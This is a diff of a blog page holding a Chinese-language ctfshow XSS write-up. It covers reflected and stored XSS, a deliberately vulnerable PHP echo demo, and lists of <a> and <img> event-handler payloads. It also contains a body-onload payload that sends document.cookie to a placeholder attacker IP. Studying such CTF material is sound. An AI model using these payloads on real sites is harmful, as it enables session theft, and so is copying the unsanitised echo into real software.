@@ -1766,9 +1766,11 @@
 <h2 id="0x03xss攻击"><a href="#0x03xss攻击" class="headerlink" title="0x03xss攻击"></a>0x03xss攻击</h2><p>XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
 <p>（1）来自内部的攻击<br>  主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
 <p>（2）来自外部的攻击<br>  主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
-<h2 id="0x04xss分类及介绍"><a href="#0x04xss分类及介绍" class="headerlink" title="0x04xss分类及介绍"></a>0x04xss分类及介绍</h2><h4 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h4><p>（1）原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
-<h4 id="2-攻击方式"><a href="#2-攻击方式" class="headerlink" title="2 攻击方式"></a>2 攻击方式</h4><p>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
-<h4 id="3-判断是否存在反射型xss漏洞并利用"><a href="#3-判断是否存在反射型xss漏洞并利用" class="headerlink" title="3 判断是否存在反射型xss漏洞并利用"></a>3 判断是否存在反射型xss漏洞并利用</h4><p>判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入</p>
+<h2 id="0x04xss分类及介绍"><a href="#0x04xss分类及介绍" class="headerlink" title="0x04xss分类及介绍"></a>0x04xss分类及介绍</h2><h4 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h4><p>1.原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
+<p>2.攻击方式</p>
+<p>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
+<p>3 判断是否存在反射型xss漏洞并利用</p>
+<p>判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入</p>
 <p>这里简单写个demo来看看</p>
 <p>demo</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure>
@@ -1795,9 +1797,35 @@
 
 <ul>
 <li><code>&lt;script&gt;</code>标签用于在HTML文档中嵌入或引用JavaScript代码。浏览器会执行<code>&lt;script&gt;</code>标签内的代码。</li>
-<li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本“XSS”。</li>
+<li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本内容，这里的内容就是括号里面的“XSS”。</li>
 </ul>
-<p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+<p>反射型XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+<h4 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h4><p><img src="/./../image/achieve/202411/xss--ctfshow/ac96e3daa1c8765aeadac3e7a94fda5f.png" alt="img"></p>
+<p>（1）原理<br>  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p>
+<p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
+<p>（3）payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析一下这个代码</p>
+<ol>
+<li><strong><code>&lt;img&gt;</code> 标签</strong>：<ul>
+<li>这是一个用于插入图像的 HTML 标签。在正常情况下，<code>src</code> 属性应该包含一个指向图像文件的有效 URL。</li>
+</ul>
+</li>
+<li>**<code>src=&quot;1&quot;</code>**：<ul>
+<li>在这里，<code>src</code> 属性被设置为 <code>&quot;1&quot;</code>，这是一个无效的图像链接。当浏览器尝试加载这个图像时，它会失败，因为没有有效的图像文件可以加载。</li>
+</ul>
+</li>
+<li><strong><code>onerror</code> 属性</strong>：<ul>
+<li><code>onerror</code> 是一个事件处理程序，当图片加载失败时触发。在这种情况下，由于 <code>src</code> 指向的是一个无效的资源，<code>onerror</code> 中的 JavaScript 代码将被执行。</li>
+</ul>
+</li>
+<li>**<code>alert(/xss/)</code>**：<ul>
+<li>这是在 <code>onerror</code> 事件被触发时执行的 JavaScript 代码。<code>alert</code> 函数会弹出一个对话框，显示内容 <code>/xss/</code>。这里的 <code>/xss/</code> 是一个正则表达式字面量，在弹出的对话框中会被当作字符串处理。</li>
+</ul>
+</li>
+</ol>
+<p>其实我们下面也会提到关于标签的，这里只是其中一种</p>
 <h2 id="0x05xss常见标签语句"><a href="#0x05xss常见标签语句" class="headerlink" title="0x05xss常见标签语句"></a>0x05xss常见标签语句</h2><h3 id="0x01-标签"><a href="#0x01-标签" class="headerlink" title="0x01&lt;a&gt; 标签"></a>0x01&lt;a&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x02-标签"><a href="#0x02-标签" class="headerlink" title="0x02. &lt;img&gt;标签"></a>0x02. &lt;img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
@@ -1954,9 +1982,7 @@
 
 <h4 id="ascii码转字符串脚本"><a href="#ascii码转字符串脚本" class="headerlink" title="ascii码转字符串脚本"></a>ascii码转字符串脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><h3 id="过滤xss"><a href="#过滤xss" class="headerlink" title="#过滤xss"></a>#过滤xss</h3><p>常规的先试试</p>
+<h2 id="web322-326"><a href="#web322-326" class="headerlink" title="web322-326"></a>web322-326</h2><h3 id="过滤xss"><a href="#过滤xss" class="headerlink" title="#过滤xss"></a>#过滤xss</h3><p>常规的先试试</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120151233543.png" alt="image-20241120151233543"></p>
@@ -1970,8 +1996,7 @@
 <p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120153647539.png" alt="image-20241120153647539"></p>
 <p>iframe标签也被过滤了</p>
 <p>剩下的符号我感觉跟payload暂时没什么关系，就不测了</p>
-<h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><p>跟322一样</p>
-<h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p>跟上面一样，但我看别人的wp有说过滤了小数点，但可能是环境问题我没有发现有过滤这个</p>
+<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>这次是开始存储型xss了</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
